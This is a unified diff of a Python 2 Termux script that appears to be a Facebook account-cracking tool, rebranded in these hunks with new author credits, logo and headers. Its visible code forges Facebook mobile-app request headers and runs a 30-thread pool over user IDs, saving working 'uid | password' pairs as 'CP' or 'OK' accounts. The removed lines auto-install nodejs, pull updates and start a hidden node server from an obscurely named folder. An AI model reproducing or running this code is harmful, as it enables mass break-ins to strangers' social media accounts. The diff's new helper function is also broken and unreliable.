@@ -1,67 +1,60 @@
-#coding=utf-8
-#!/usr/bin/python2
-#Originally Written By Muhammad Hamza
-try:
-    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+#coding:utf-8
+#!/user/bin/python2
+#coding by DADOFBAD
+try:    
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
 except ImportError:
-    os.system("pip2 install requests")
-    os.system("python2 index.xbn")
-os.system("clear")
-"""
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('python2 IKB.py')
 try:
-    my = requests.get("https://muhammadhamza365.byethost7.com")
-except requests.exceptions.ConnectionError:
-    print("")
-    print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
-    print("")
-    time.sleep(1)
-    raw_input(" Press enter to try again ")
-    os.system("python2 new.py")"""
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
-    os.system("apt update && apt install nodejs -y")
-from requests.exceptions import ConnectionError
-os.system("git pull")
+    os.mkdir('IKB')
+except OSError:
+    pass
 
-if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
-    os.system("fuser -k 5000/tcp &")
-    os.system("#")
-    os.system("cd ..... && npm install")
-    os.system("cd ..... && node index.js &")
-    os.system("clear")
-    time.sleep(10)
-elif os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
-    os.system("fuser -k 5000/tcp &")
-    os.system("#")
-    os.system("cd ..... && node index.js &")
-    os.system("clear")
+from requests.exceptions import ConnectionError
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-Telkomsel': repr(sim),'x-fb-net-Telkomsel': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
-sys.setdefaultencoding("utf-8")
-c = "\033[1;32m"
-c2 = "\033[0;97m"
-c3 = "\033[1;31m"
-#MyLogo
-logo = """
+sys.setdefaultencoding("utf8")
 
-\t##     ##     #######     ########  
-\t##     ##    ##     ##    ##     ## 
-\t##     ##    ##     ##    ##     ## 
-\t#########    ##     ##    ########  
-\t##     ##    ##     ##    ##        
-\t##     ##    ##     ##    ##        
-\t##     ##     #######     ##        
+def exit():
+    print '[!] Exit'
+    os.sys.exit()
+    
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+        return cetak(d)
+        
 
------------------------------------------------
 
-➣ Author   : Muhammad Hamza
-➣ Facebook : Muhammad Hamza
-➣ Github   : https://github.com/Hamzahash
-➣ You cannot decompile it bro :)
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
 
------------------------------------------------
+#Dev:DAD_OFBAD
+#### LOGO ####
+logo = """                          
+\033[1;94m_________ _        ______  
+\033[1;94m\__   __/| \    /\(  ___ \ 
+\033[1;94m   ) (   |  \  / /| (   ) )
+\033[1;94m   | |   |  (_/ / | (__/ / 
+\033[1;94m   | |   |   _ (  |  __ (  
+ \033[1;94m  | |   |  ( \ \ | (  \ \ 
+\033[1;94m___) (___|  /  \ \| )___) )
+\033[1;94m\_______/|_/    \/|/ \___/                                                                            
 """
 def method_menu():
     os.system("clear")
@@ -835,15 +828,19 @@ def l_menu_select():
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
 																	cps.append(uid+pass7)
-																
+															
 		except:
 			pass
-	
+		
 	p = ThreadPool(30)
 	p.map(main, id)
 	print('')
 	print('[✓] Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mIMTIAZ_BALOCH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mImtiaz_Baloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 	print "  \033[1;91m«---•◈•---Developed By DAD❤OF❤BAD--•◈•---»" #Dev:DAD-OFBAD
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-	
+	raw_input('Back')
+	menu()
+    
+if __name__ == '__main__':
+	menu()
